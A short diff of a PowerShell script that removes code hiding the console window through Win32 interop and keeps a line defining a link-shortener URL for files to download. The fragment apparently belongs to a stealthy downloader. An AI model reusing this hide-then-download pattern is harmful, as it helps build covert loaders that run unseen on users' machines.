@@ -1,33 +1,3 @@
-#Start mo
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-
-    public class ConsoleWindow {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        
-        public const int SW_HIDE = 0;
-        public const int SW_SHOW = 5;
-
-        public static void Hide() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_HIDE);
-        }
-
-        public static void Show() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_SHOW);
-        }
-    }
-"@
-
-
-# Hide the console window
-[ConsoleWindow]::Hide()
 
 # Define the URLs of the files to download
 $url1 = "https://lnkfwd.com/u/KtRiC0kh"
